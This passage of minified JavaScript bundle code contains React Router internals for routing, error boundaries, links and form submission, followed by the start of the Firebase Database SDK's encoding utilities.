ax(t,e,n){var _;je(Fs(),"useRoutes() may be used only in the context of a <Router> component.");let{navigator:r}=g.useContext(Lt),{matches:s}=g.useContext(ln),o=s[s.length-1],a=o?o.params:{},l=o?o.pathname:"/",c=o?o.pathnameBase:"/",d=o&&o.route;{let m=d&&d.path||"";cx(l,!d||m.endsWith("*")||m.endsWith("*?"),`You rendered descendant <Routes> (or called \`useRoutes()\`) at "${l}" (under <Route path="${m}">) but the parent route path has no trailing "*". This means if you navigate deeper, the parent won't match anymore and therefore the child routes will never render.

Please change the parent <Route path="${m}"> to <Route path="${m==="/"?"*":`${m}/*`}">.`)}let p=mn(),f;if(e){let m=typeof e=="string"?Ms(e):e;je(c==="/"||((_=m.pathname)==null?void 0:_.startsWith(c)),`When overriding the location using \`<Routes location>\` or \`useRoutes(routes, location)\`, the location pathname must begin with the portion of the URL pathname that was matched by all parent routes. The current pathname base is "${c}" but pathname "${m.pathname}" was given in the \`location\` prop.`),f=m}else f=p;let u=f.pathname||"/",b=u;if(c!=="/"){let m=c.replace(/^\//,"").split("/");b="/"+u.replace(/^\//,"").split("/").slice(m.length).join("/")}let x=n&&n.state.matches.length?n.state.matches.map(m=>Object.assign(m,{route:n.manifest[m.route.id]||m.route})):Yg(t,{pathname:b});an(d||x!=null,`No routes matched location "${f.pathname}${f.search}${f.hash}" `),an(x==null||x[x.length-1].route.element!==void 0||x[x.length-1].route.Component!==void 0||x[x.length-1].route.lazy!==void 0,`Matched leaf route at location "${f.pathname}${f.search}${f.hash}" does not have an element or Component. This means it will render an <Outlet /> with a null value by default resulting in an "empty" page.`);let v=g1(x&&x.map(m=>Object.assign({},m,{params:Object.assign({},a,m.params),pathname:rn([c,r.encodeLocation?r.encodeLocation(m.pathname.replace(/%/g,"%25").replace(/\?/g,"%3F").replace(/#/g,"%23")).pathname:m.pathname]),pathnameBase:m.pathnameBase==="/"?c:rn([c,r.encodeLocation?r.encodeLocation(m.pathnameBase.replace(/%/g,"%25").replace(/\?/g,"%3F").replace(/#/g,"%23")).pathname:m.pathnameBase])})),s,n);return e&&v?g.createElement(po.Provider,{value:{location:{pathname:"/",search:"",hash:"",state:null,key:"default",mask:void 0,...f},navigationType:"POP"}},v):v}function p1(){let t=_1(),e=Xb(t)?`${t.status} ${t.statusText}`:t instanceof Error?t.message:JSON.stringify(t),n=t instanceof Error?t.stack:null,r="rgba(200,200,200, 0.5)",s={padding:"0.5rem",backgroundColor:r},o={padding:"2px 4px",backgroundColor:r},a=null;return console.error("Error handled by React Router default ErrorBoundary:",t),a=g.createElement(g.Fragment,null,g.createElement("p",null,"💿 Hey developer 👋"),g.createElement("p",null,"You can provide a way better UX than this when your app throws errors by providing your own ",g.createElement("code",{style:o},"ErrorBoundary")," or"," ",g.createElement("code",{style:o},"errorElement")," prop on your route.")),g.createElement(g.Fragment,null,g.createElement("h2",null,"Unexpected Application Error!"),g.createElement("h3",{style:{fontStyle:"italic"}},e),n?g.createElement("pre",{style:s},n):null,a)}var f1=g.createElement(p1,null),lx=class extends g.Component{constructor(t){super(t),this.state={location:t.location,revalidation:t.revalidation,error:t.error}}static getDerivedStateFromError(t){return{error:t}}static getDerivedStateFromProps(t,e){return e.location!==t.location||e.revalidation!=="idle"&&t.revalidation==="idle"?{error:t.error,location:t.location,revalidation:t.revalidation}:{error:t.error!==void 0?t.error:e.error,location:e.location,revalidation:t.revalidation||e.revalidation}}componentDidCatch(t,e){this.props.onError?this.props.onError(t,e):console.error("React Router caught the following error during render",t)}render(){let t=this.state.error;if(this.context&&typeof t=="object"&&t&&"digest"in t&&typeof t.digest=="string"){const n=l1(t.digest);n&&(t=n)}let e=t!==void 0?g.createElement(ln.Provider,{value:this.props.routeContext},g.createElement(Au.Provider,{value:t,children:this.props.component})):this.props.children;return this.context?g.createElement(h1,{error:t},e):e}};lx.contextType=nx;var oc=new WeakMap;function h1({children:t,error:e}){let{basename:n}=g.useContext(Lt);if(typeof e=="object"&&e&&"digest"in e&&typeof e.digest=="string"){let r=a1(e.digest);if(r){let s=oc.get(e);if(s)throw s;let o=ex(r.location,n),a=o.absoluteURL||o.to;if(t1(a))throw new Error("Invalid redirect location");if(Zg&&!oc.get(e))if(o.isExternal||r.reloadDocument)window.location.href=a;else{const l=Promise.resolve().then(()=>window.__reactRouterDataRouter.navigate(o.to,{replace:r.replace}));throw oc.set(e,l),l}return g.createElement("meta",{httpEquiv:"refresh",content:`0;url=${a}`})}}return t}function m1({routeContext:t,match:e,children:n}){let r=g.useContext(Os);return r&&r.static&&r.staticContext&&(e.route.errorElement||e.route.ErrorBoundary)&&(r.staticContext._deepestRenderedBoundaryId=e.route.id),g.createElement(ln.Provider,{value:t},n)}function g1(t,e=[],n){let r=n==null?void 0:n.state;if(t==null){if(!r)return null;if(r.errors)t=r.matches;else if(e.length===0&&!r.initialized&&r.matches.length>0)t=r.matches;else return null}let s=t,o=r==null?void 0:r.errors;if(o!=null){let p=s.findIndex(f=>f.route.id&&(o==null?void 0:o[f.route.id])!==void 0);je(p>=0,`Could not find a matching route for errors on route IDs: ${Object.keys(o).join(",")}`),s=s.slice(0,Math.min(s.length,p+1))}let a=!1,l=-1;if(n&&r){a=r.renderFallback;for(let p=0;p<s.length;p++){let f=s[p];if((f.route.HydrateFallback||f.route.hydrateFallbackElement)&&(l=p),f.route.id){let{loaderData:u,errors:b}=r,x=f.route.loader&&!u.hasOwnProperty(f.route.id)&&(!b||b[f.route.id]===void 0);if(f.route.lazy||x){n.isStatic&&(a=!0),l>=0?s=s.slice(0,l+1):s=[s[0]];break}}}}let c=n==null?void 0:n.onError,d=r&&c?(p,f)=>{var u,b;c(p,{location:r.location,params:((b=(u=r.matches)==null?void 0:u[0])==null?void 0:b.params)??{},pattern:Jb(r.matches),errorInfo:f})}:void 0;return s.reduceRight((p,f,u)=>{let b,x=!1,v=null,_=null;r&&(b=o&&f.route.id?o[f.route.id]:void 0,v=f.route.errorElement||f1,a&&(l<0&&u===0?(cx("route-fallback",!1,"No `HydrateFallback` element provided to render during initial hydration"),x=!0,_=null):l===u&&(x=!0,_=f.route.hydrateFallbackElement||null)));let m=e.concat(s.slice(0,u+1)),h=()=>{let y;return b?y=v:x?y=_:f.route.Component?y=g.createElement(f.route.Component,null):f.route.element?y=f.route.element:y=p,g.createElement(m1,{match:f,routeContext:{outlet:p,matches:m,isDataRoute:r!=null},children:y})};return r&&(f.route.ErrorBoundary||f.route.errorElement||u===0)?g.createElement(lx,{location:r.location,revalidation:r.revalidation,component:v,error:b,children:h(),routeContext:{outlet:null,matches:m,isDataRoute:!0},onError:d}):h()},null)}function Pu(t){return`${t} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`}function x1(t){let e=g.useContext(Os);return je(e,Pu(t)),e}function v1(t){let e=g.useContext(hl);return je(e,Pu(t)),e}function y1(t){let e=g.useContext(ln);return je(e,Pu(t)),e}function Du(t){let e=y1(t),n=e.matches[e.matches.length-1];return je(n.route.id,`${t} can only be used on routes that contain a unique "id"`),n.route.id}function b1(){return Du("useRouteId")}function _1(){var r;let t=g.useContext(Au),e=v1("useRouteError"),n=Du("useRouteError");return t!==void 0?t:(r=e.errors)==null?void 0:r[n]}function w1(){let{router:t}=x1("useNavigate"),e=Du("useNavigate"),n=g.useRef(!1);return ox(()=>{n.current=!0}),g.useCallback(async(s,o={})=>{an(n.current,ix),n.current&&(typeof s=="number"?await t.navigate(s):await t.navigate(s,{fromRouteId:e,...o}))},[t,e])}var Mf={};function cx(t,e,n){!e&&!Mf[t]&&(Mf[t]=!0,an(!1,n))}g.memo(S1);function S1({routes:t,manifest:e,future:n,state:r,isStatic:s,onError:o}){return ax(t,void 0,{manifest:e,state:r,isStatic:s,onError:o})}function dx({to:t,replace:e,state:n,relative:r}){je(Fs(),"<Navigate> may be used only in the context of a <Router> component.");let{static:s}=g.useContext(Lt);an(!s,"<Navigate> must not be used on the initial render in a <StaticRouter>. This is a no-op, but you should modify your code so the <Navigate> is only ever rendered in response to some user interaction or state change.");let{matches:o}=g.useContext(ln),{pathname:a}=mn(),l=gt(),c=fl(t,Tu(o),a,r==="path"),d=JSON.stringify(c);return g.useEffect(()=>{l(JSON.parse(d),{replace:e,state:n,relative:r})},[l,d,r,e,n]),null}function Le(t){je(!1,"A <Route> is only ever to be used as the child of <Routes> element, never rendered directly. Please wrap your <Route> in a <Routes>.")}function C1({basename:t="/",children:e=null,location:n,navigationType:r="POP",navigator:s,static:o=!1,useTransitions:a}){je(!Fs(),"You cannot render a <Router> inside another <Router>. You should never have more than one in your app.");let l=t.replace(/^\/*/,"/"),c=g.useMemo(()=>({basename:l,navigator:s,static:o,useTransitions:a,future:{}}),[l,s,o,a]);typeof n=="string"&&(n=Ms(n));let{pathname:d="/",search:p="",hash:f="",state:u=null,key:b="default",mask:x}=n,v=g.useMemo(()=>{let _=Dn(d,l);return _==null?null:{location:{pathname:_,search:p,hash:f,state:u,key:b,mask:x},navigationType:r}},[l,d,p,f,u,b,r,x]);return an(v!=null,`<Router basename="${l}"> is not able to match the URL "${d}${p}${f}" because it does not start with the basename, so the <Router> won't render anything.`),v==null?null:g.createElement(Lt.Provider,{value:c},g.createElement(po.Provider,{children:e,value:v}))}function j1({children:t,location:e}){return u1(hd(t),e)}function hd(t,e=[]){let n=[];return g.Children.forEach(t,(r,s)=>{if(!g.isValidElement(r))return;let o=[...e,s];if(r.type===g.Fragment){n.push.apply(n,hd(r.props.children,o));return}je(r.type===Le,`[${typeof r.type=="string"?r.type:r.type.name}] is not a <Route> component. All component children of <Routes> must be a <Route> or <React.Fragment>`),je(!r.props.index||!r.props.children,"An index route cannot have child routes.");let a={id:r.props.id||o.join("-"),caseSensitive:r.props.caseSensitive,element:r.props.element,Component:r.props.Component,index:r.props.index,path:r.props.path,middleware:r.props.middleware,loader:r.props.loader,action:r.props.action,hydrateFallbackElement:r.props.hydrateFallbackElement,HydrateFallback:r.props.HydrateFallback,errorElement:r.props.errorElement,ErrorBoundary:r.props.ErrorBoundary,hasErrorBoundary:r.props.hasErrorBoundary===!0||r.props.ErrorBoundary!=null||r.props.errorElement!=null,shouldRevalidate:r.props.shouldRevalidate,handle:r.props.handle,lazy:r.props.lazy};r.props.children&&(a.children=hd(r.props.children,o)),n.push(a)}),n}var ia="get",oa="application/x-www-form-urlencoded";function ml(t){return typeof HTMLElement<"u"&&t instanceof HTMLElement}function k1(t){return ml(t)&&t.tagName.toLowerCase()==="button"}function N1(t){return ml(t)&&t.tagName.toLowerCase()==="form"}function E1(t){return ml(t)&&t.tagName.toLowerCase()==="input"}function I1(t){return!!(t.metaKey||t.altKey||t.ctrlKey||t.shiftKey)}function R1(t,e){return t.button===0&&(!e||e==="_self")&&!I1(t)}var Ho=null;function T1(){if(Ho===null)try{new FormData(document.createElement("form"),0),Ho=!1}catch{Ho=!0}return Ho}var A1=new Set(["application/x-www-form-urlencoded","multipart/form-data","text/plain"]);function ac(t){return t!=null&&!A1.has(t)?(an(!1,`"${t}" is not a valid \`encType\` for \`<Form>\`/\`<fetcher.Form>\` and will default to "${oa}"`),null):t}function P1(t,e){let n,r,s,o,a;if(N1(t)){let l=t.getAttribute("action");r=l?Dn(l,e):null,n=t.getAttribute("method")||ia,s=ac(t.getAttribute("enctype"))||oa,o=new FormData(t)}else if(k1(t)||E1(t)&&(t.type==="submit"||t.type==="image")){let l=t.form;if(l==null)throw new Error('Cannot submit a <button> or <input type="submit"> without a <form>');let c=t.getAttribute("formaction")||l.getAttribute("action");if(r=c?Dn(c,e):null,n=t.getAttribute("formmethod")||l.getAttribute("method")||ia,s=ac(t.getAttribute("formenctype"))||ac(l.getAttribute("enctype"))||oa,o=new FormData(l,t),!T1()){let{name:d,type:p,value:f}=t;if(p==="image"){let u=d?`${d}.`:"";o.append(`${u}x`,"0"),o.append(`${u}y`,"0")}else d&&o.append(d,f)}}else{if(ml(t))throw new Error('Cannot submit element that is not <form>, <button>, or <input type="submit|image">');n=ia,r=null,s=oa,a=t}return o&&s==="text/plain"&&(a=o,o=void 0),{action:r,method:n.toLowerCase(),encType:s,formData:o,body:a}}Object.getOwnPropertyNames(Object.prototype).sort().join("\0");function Lu(t,e){if(t===!1||t===null||typeof t>"u")throw new Error(e)}function ux(t,e,n,r){let s=typeof t=="string"?new URL(t,typeof window>"u"?"server://singlefetch/":window.location.origin):t;return n?s.pathname.endsWith("/")?s.pathname=`${s.pathname}_.${r}`:s.pathname=`${s.pathname}.${r}`:s.pathname==="/"?s.pathname=`_root.${r}`:e&&Dn(s.pathname,e)==="/"?s.pathname=`${Pa(e)}/_root.${r}`:s.pathname=`${Pa(s.pathname)}.${r}`,s}async function D1(t,e){if(t.id in e)return e[t.id];try{let n=await import(t.module);return e[t.id]=n,n}catch(n){return console.error(`Error loading route module \`${t.module}\`, reloading page...`),console.error(n),window.__reactRouterContext&&window.__reactRouterContext.isSpaMode,window.location.reload(),new Promise(()=>{})}}function L1(t){return t==null?!1:t.href==null?t.rel==="preload"&&typeof t.imageSrcSet=="string"&&typeof t.imageSizes=="string":typeof t.rel=="string"&&typeof t.href=="string"}async function z1(t,e,n){let r=await Promise.all(t.map(async s=>{let o=e.routes[s.route.id];if(o){let a=await D1(o,n);return a.links?a.links():[]}return[]}));return W1(r.flat(1).filter(L1).filter(s=>s.rel==="stylesheet"||s.rel==="preload").map(s=>s.rel==="stylesheet"?{...s,rel:"prefetch",as:"style"}:{...s,rel:"prefetch"}))}function Of(t,e,n,r,s,o){let a=(c,d)=>n[d]?c.route.id!==n[d].route.id:!0,l=(c,d)=>{var p;return n[d].pathname!==c.pathname||((p=n[d].route.path)==null?void 0:p.endsWith("*"))&&n[d].params["*"]!==c.params["*"]};return o==="assets"?e.filter((c,d)=>a(c,d)||l(c,d)):o==="data"?e.filter((c,d)=>{var f;let p=r.routes[c.route.id];if(!p||!p.hasLoader)return!1;if(a(c,d)||l(c,d))return!0;if(c.route.shouldRevalidate){let u=c.route.shouldRevalidate({currentUrl:new URL(s.pathname+s.search+s.hash,window.origin),currentParams:((f=n[0])==null?void 0:f.params)||{},nextUrl:new URL(t,window.origin),nextParams:c.params,defaultShouldRevalidate:!0});if(typeof u=="boolean")return u}return!0}):[]}function M1(t,e,{includeHydrateFallback:n}={}){return O1(t.map(r=>{let s=e.routes[r.route.id];if(!s)return[];let o=[s.module];return s.clientActionModule&&(o=o.concat(s.clientActionModule)),s.clientLoaderModule&&(o=o.concat(s.clientLoaderModule)),n&&s.hydrateFallbackModule&&(o=o.concat(s.hydrateFallbackModule)),s.imports&&(o=o.concat(s.imports)),o}).flat(1))}function O1(t){return[...new Set(t)]}function F1(t){let e={},n=Object.keys(t).sort();for(let r of n)e[r]=t[r];return e}function W1(t,e){let n=new Set;return new Set(e),t.reduce((r,s)=>{let o=JSON.stringify(F1(s));return n.has(o)||(n.add(o),r.push({key:o,link:s})),r},[])}function zu(){let t=g.useContext(Os);return Lu(t,"You must render this element inside a <DataRouterContext.Provider> element"),t}function $1(){let t=g.useContext(hl);return Lu(t,"You must render this element inside a <DataRouterStateContext.Provider> element"),t}var Mu=g.createContext(void 0);Mu.displayName="FrameworkContext";function gl(){let t=g.useContext(Mu);return Lu(t,"You must render this element inside a <HydratedRouter> element"),t}function B1(t,e){let n=g.useContext(Mu),[r,s]=g.useState(!1),[o,a]=g.useState(!1),{onFocus:l,onBlur:c,onMouseEnter:d,onMouseLeave:p,onTouchStart:f}=e,u=g.useRef(null);g.useEffect(()=>{if(t==="render"&&a(!0),t==="viewport"){let v=m=>{m.forEach(h=>{a(h.isIntersecting)})},_=new IntersectionObserver(v,{threshold:.5});return u.current&&_.observe(u.current),()=>{_.disconnect()}}},[t]),g.useEffect(()=>{if(r){let v=setTimeout(()=>{a(!0)},100);return()=>{clearTimeout(v)}}},[r]);let b=()=>{s(!0)},x=()=>{s(!1),a(!1)};return n?t!=="intent"?[o,u,{}]:[o,u,{onFocus:ai(l,b),onBlur:ai(c,x),onMouseEnter:ai(d,b),onMouseLeave:ai(p,x),onTouchStart:ai(f,b)}]:[!1,u,{}]}function ai(t,e){return n=>{t&&t(n),n.defaultPrevented||e(n)}}function U1({page:t,...e}){let n=n1(),{nonce:r}=gl(),{router:s}=zu(),o=g.useMemo(()=>Yg(s.routes,t,s.basename),[s.routes,t,s.basename]);return o?(e.nonce==null&&r&&(e={...e,nonce:r}),n?g.createElement(V1,{page:t,matches:o,...e}):g.createElement(G1,{page:t,matches:o,...e})):null}function H1(t){let{manifest:e,routeModules:n}=gl(),[r,s]=g.useState([]);return g.useEffect(()=>{let o=!1;return z1(t,e,n).then(a=>{o||s(a)}),()=>{o=!0}},[t,e,n]),r}function V1({page:t,matches:e,...n}){let r=mn(),{future:s}=gl(),{basename:o}=zu(),a=g.useMemo(()=>{if(t===r.pathname+r.search+r.hash)return[];let l=ux(t,o,s.v8_trailingSlashAwareDataRequests,"rsc"),c=!1,d=[];for(let p of e)typeof p.route.shouldRevalidate=="function"?c=!0:d.push(p.route.id);return c&&d.length>0&&l.searchParams.set("_routes",d.join(",")),[l.pathname+l.search]},[o,s.v8_trailingSlashAwareDataRequests,t,r,e]);return g.createElement(g.Fragment,null,a.map(l=>g.createElement("link",{key:l,rel:"prefetch",as:"fetch",href:l,...n})))}function G1({page:t,matches:e,...n}){let r=mn(),{future:s,manifest:o,routeModules:a}=gl(),{basename:l}=zu(),{loaderData:c,matches:d}=$1(),p=g.useMemo(()=>Of(t,e,d,o,r,"data"),[t,e,d,o,r]),f=g.useMemo(()=>Of(t,e,d,o,r,"assets"),[t,e,d,o,r]),u=g.useMemo(()=>{if(t===r.pathname+r.search+r.hash)return[];let v=new Set,_=!1;if(e.forEach(h=>{var w;let y=o.routes[h.route.id];!y||!y.hasLoader||(!p.some(N=>N.route.id===h.route.id)&&h.route.id in c&&((w=a[h.route.id])!=null&&w.shouldRevalidate)||y.hasClientLoader?_=!0:v.add(h.route.id))}),v.size===0)return[];let m=ux(t,l,s.v8_trailingSlashAwareDataRequests,"data");return _&&v.size>0&&m.searchParams.set("_routes",e.filter(h=>v.has(h.route.id)).map(h=>h.route.id).join(",")),[m.pathname+m.search]},[l,s.v8_trailingSlashAwareDataRequests,c,r,o,p,e,t,a]),b=g.useMemo(()=>M1(f,o),[f,o]),x=H1(f);return g.createElement(g.Fragment,null,u.map(v=>g.createElement("link",{key:v,rel:"prefetch",as:"fetch",href:v,...n})),b.map(v=>g.createElement("link",{key:v,rel:"modulepreload",href:v,...n})),x.map(({key:v,link:_})=>g.createElement("link",{key:v,nonce:n.nonce,..._,crossOrigin:_.crossOrigin??n.crossOrigin})))}function Y1(...t){return e=>{t.forEach(n=>{typeof n=="function"?n(e):n!=null&&(n.current=e)})}}var K1=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u";try{K1&&(window.__reactRouterVersion="7.18.2")}catch{}function Q1({basename:t,children:e,useTransitions:n,window:r}){let s=g.useRef();s.current==null&&(s.current=Eb({window:r,v5Compat:!0}));let o=s.current,[a,l]=g.useState({action:o.action,location:o.location}),c=g.useCallback(d=>{n===!1?l(d):g.startTransition(()=>l(d))},[n]);return g.useLayoutEffect(()=>o.listen(c),[o,c]),g.createElement(C1,{basename:t,children:e,location:a.location,navigationType:a.action,navigator:o,useTransitions:n})}var px=g.forwardRef(function({onClick:e,discover:n="render",prefetch:r="none",relative:s,reloadDocument:o,replace:a,mask:l,state:c,target:d,to:p,preventScrollReset:f,viewTransition:u,defaultShouldRevalidate:b,...x},v){let{basename:_,navigator:m,useTransitions:h}=g.useContext(Lt),y=typeof p=="string"&&Ru.test(p),w=ex(p,_);p=w.to;let N=c1(p,{relative:s}),R=mn(),S=null;if(l){let F=fl(l,[],R.mask?R.mask.pathname:"/",!0);_!=="/"&&(F.pathname=F.pathname==="/"?_:rn([_,F.pathname])),S=m.createHref(F)}let[C,j,P]=B1(r,x),z=Z1(p,{replace:a,mask:l,state:c,target:d,preventScrollReset:f,relative:s,viewTransition:u,defaultShouldRevalidate:b,useTransitions:h});function M(F){e&&e(F),F.defaultPrevented||z(F)}let L=!(w.isExternal||o),K=g.createElement("a",{...x,...P,href:(L?S:void 0)||w.absoluteURL||N,onClick:L?M:e,ref:Y1(v,j),target:d,"data-discover":!y&&n==="render"?"true":void 0});return C&&!y?g.createElement(g.Fragment,null,K,g.createElement(U1,{page:N})):K});px.displayName="Link";var q1=g.forwardRef(function({"aria-current":e="page",caseSensitive:n=!1,className:r="",end:s=!1,style:o,to:a,viewTransition:l,children:c,...d},p){let f=fo(a,{relative:d.relative}),u=mn(),b=g.useContext(hl),{navigator:x,basename:v}=g.useContext(Lt),_=b!=null&&s_(f)&&l===!0,m=x.encodeLocation?x.encodeLocation(f).pathname:f.pathname,h=u.pathname,y=b&&b.navigation&&b.navigation.location?b.navigation.location.pathname:null;n||(h=h.toLowerCase(),y=y?y.toLowerCase():null,m=m.toLowerCase()),y&&v&&(y=Dn(y,v)||y);const w=m!=="/"&&m.endsWith("/")?m.length-1:m.length;let N=h===m||!s&&h.startsWith(m)&&h.charAt(w)==="/",R=y!=null&&(y===m||!s&&y.startsWith(m)&&y.charAt(m.length)==="/"),S={isActive:N,isPending:R,isTransitioning:_},C=N?e:void 0,j;typeof r=="function"?j=r(S):j=[r,N?"active":null,R?"pending":null,_?"transitioning":null].filter(Boolean).join(" ");let P=typeof o=="function"?o(S):o;return g.createElement(px,{...d,"aria-current":C,className:j,ref:p,style:P,to:a,viewTransition:l},typeof c=="function"?c(S):c)});q1.displayName="NavLink";var X1=g.forwardRef(({discover:t="render",fetcherKey:e,navigate:n,reloadDocument:r,replace:s,state:o,method:a=ia,action:l,onSubmit:c,relative:d,preventScrollReset:p,viewTransition:f,defaultShouldRevalidate:u,...b},x)=>{let{useTransitions:v}=g.useContext(Lt),_=n_(),m=r_(l,{relative:d}),h=a.toLowerCase()==="get"?"get":"post",y=typeof l=="string"&&Ru.test(l),w=N=>{if(c&&c(N),N.defaultPrevented)return;N.preventDefault();let R=N.nativeEvent.submitter,S=(R==null?void 0:R.getAttribute("formmethod"))||a,C=()=>_(R||N.currentTarget,{fetcherKey:e,method:S,navigate:n,replace:s,state:o,relative:d,preventScrollReset:p,viewTransition:f,defaultShouldRevalidate:u});v&&n!==!1?g.startTransition(()=>C()):C()};return g.createElement("form",{ref:x,method:h,action:m,onSubmit:r?c:w,...b,"data-discover":!y&&t==="render"?"true":void 0})});X1.displayName="Form";function J1(t){return`${t} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`}function fx(t){let e=g.useContext(Os);return je(e,J1(t)),e}function Z1(t,{target:e,replace:n,mask:r,state:s,preventScrollReset:o,relative:a,viewTransition:l,defaultShouldRevalidate:c,useTransitions:d}={}){let p=gt(),f=mn(),u=fo(t,{relative:a});return g.useCallback(b=>{if(R1(b,e)){b.preventDefault();let x=n!==void 0?n:Yi(f)===Yi(u),v=()=>p(t,{replace:x,mask:r,state:s,preventScrollReset:o,relative:a,viewTransition:l,defaultShouldRevalidate:c});d?g.startTransition(()=>v()):v()}},[f,p,u,n,r,s,e,t,o,a,l,c,d])}var e_=0,t_=()=>`__${String(++e_)}__`;function n_(){let{router:t}=fx("useSubmit"),{basename:e}=g.useContext(Lt),n=b1(),r=t.fetch,s=t.navigate;return g.useCallback(async(o,a={})=>{let{action:l,method:c,encType:d,formData:p,body:f}=P1(o,e);if(a.navigate===!1){let u=a.fetcherKey||t_();await r(u,n,a.action||l,{defaultShouldRevalidate:a.defaultShouldRevalidate,preventScrollReset:a.preventScrollReset,formData:p,body:f,formMethod:a.method||c,formEncType:a.encType||d,flushSync:a.flushSync})}else await s(a.action||l,{defaultShouldRevalidate:a.defaultShouldRevalidate,preventScrollReset:a.preventScrollReset,formData:p,body:f,formMethod:a.method||c,formEncType:a.encType||d,replace:a.replace,state:a.state,fromRouteId:n,flushSync:a.flushSync,viewTransition:a.viewTransition})},[r,s,e,n])}function r_(t,{relative:e}={}){let{basename:n}=g.useContext(Lt),r=g.useContext(ln);je(r,"useFormAction must be used inside a RouteContext");let[s]=r.matches.slice(-1),o={...fo(t||".",{relative:e})},a=mn();if(t==null){o.search=a.search;let l=new URLSearchParams(o.search),c=l.getAll("index");if(c.some(p=>p==="")){l.delete("index"),c.filter(f=>f).forEach(f=>l.append("index",f));let p=l.toString();o.search=p?`?${p}`:""}}return(!t||t===".")&&s.route.index&&(o.search=o.search?o.search.replace(/^\?/,"?index&"):"?index"),n!=="/"&&(o.pathname=o.pathname==="/"?n:rn([n,o.pathname])),Yi(o)}function s_(t,{relative:e}={}){let n=g.useContext(rx);je(n!=null,"`useViewTransitionState` must be used within `react-router-dom`'s `RouterProvider`.  Did you accidentally import `RouterProvider` from `react-router`?");let{basename:r}=fx("useViewTransitionState"),s=fo(t,{relative:e});if(!n.isTransitioning)return!1;let o=Dn(n.currentLocation.pathname,r)||n.currentLocation.pathname,a=Dn(n.nextLocation.pathname,r)||n.nextLocation.pathname;return Aa(s.pathname,a)!=null||Aa(s.pathname,o)!=null}var Ff={};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const hx={NODE_ADMIN:!1,SDK_VERSION:"${JSCORE_VERSION}"};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const $=function(t,e){if(!t)throw Ws(e)},Ws=function(t){return new Error("Firebase Database ("+hx.SDK_VERSION+") INTERNAL ASSERT FAILED: "+t)};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const mx=function(t){const e=[];let n=0;for(let r=0;r<t.length;r++){let s=t.charCodeAt(r);s<128?e[n++]=s:s<2048?(e[n++]=s>>6|192,e[n++]=s&63|128):(s&64512)===55296&&r+1<t.length&&(t.charCodeAt(r+1)&64512)===56320?(s=65536+((s&1023)<<10)+(t.charCodeAt(++r)&1023),e[n++]=s>>18|240,e[n++]=s>>12&63|128,e[n++]=s>>6&63|128,e[n++]=s&63|128):(e[n++]=s>>12|224,e[n++]=s>>6&63|128,e[n++]=s&63|128)}return e},i_=function(t){const e=[];let n=0,r=0;for(;n<t.length;){const s=t[n++];if(s<128)e[r++]=String.fromCharCode(s);else if(s>191&&s<224){const o=t[n++];e[r++]=String.fromCharCode((s&31)<<6|o&63)}else if(s>239&&s<365){const o=t[n++],a=t[n++],l=t[n++],c=((s&7)<<18|(o&63)<<12|(a&63)<<6|l&63)-65536;e[r++]=String.fromCharCode(55296+(c>>10)),e[r++]=String.fromCharCode(56320+(c&1023))}else{const o=t[n++],a=t[n++];e[r++]=String.fromCharCode((s&15)<<12|(o&63)<<6|a&63)}}return e.join("")},Ou={byteToCharMap_:null,charToByteMap_:null,byteToCharMapWebSafe_:null,charToByteMapWebSafe_:null,ENCODED_VALS_BASE:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",get ENCODED_VALS(){return this.ENCODED_VALS_BASE+"+/="},get ENCODED_VALS_WEBSAFE(){return this.ENCODED_VALS_BASE+"-_."},HAS_NATIVE_SUPPORT:typeof atob=="function",encodeByteArray(t,e){if(!Array.isArray(t))throw Error("encodeByteArray takes an array as a parameter");this.init_();const n=e?this.byteToCharMapWebSafe_:this.byteToCharMap_,r=[];for(let s=0;s<t.length;s+=3){const o=t[s],a=s+1<t.length,l=a?t[s+1]:0,c=s+2<t.length,d=c?t[s+2]:0,p=o>>2,f=(o&3)<<4|l>>4;let u=(l&15)<<2|d>>6,b=d&63;c||(b=64,a||(u=64)),r.push(n[p],n[f],n[u],n[b])}return r.join("")},encodeString(t,e){return this.HAS_NATIVE_SUPPORT&&!e?btoa(t):this.encodeByteArray(mx(t),e)},decodeString(t,e){return this.HAS_NATIVE_SUPPORT&&!e?atob(t):i_(this.decodeStringToByteArray(t,e))},decodeStringToByteArray(t,e){this.init_();const n=e?this.charToByteMapWebSafe_:this.charToByteMap_,r=[];for(let s=0;s<t.length;){const o=n[t.charAt(s++)],l=s<t.length?n[t.charAt(s)]:0;++s;const d=s<t.length?n[t.charAt(s)]:64;++s;const f=s<t.length?n[t.charAt(s)]:64;if(++s,o==null||l==null||d==null||f==null)throw new o_;const u=o<<2|l>>4;if(r.push(u),d!==64){const b=l<<4&240|d>>2;if(r.push(b),f!==64){const x=d<<6&192|f;r.push(x)}}}return r},init_(){if(!this.byteToCharMap_){this.byteToCharMap_={},this.charToByteMap_={},this.byteToCharMapWebSafe_={},this.charToByteMapWebSafe_={};for(let 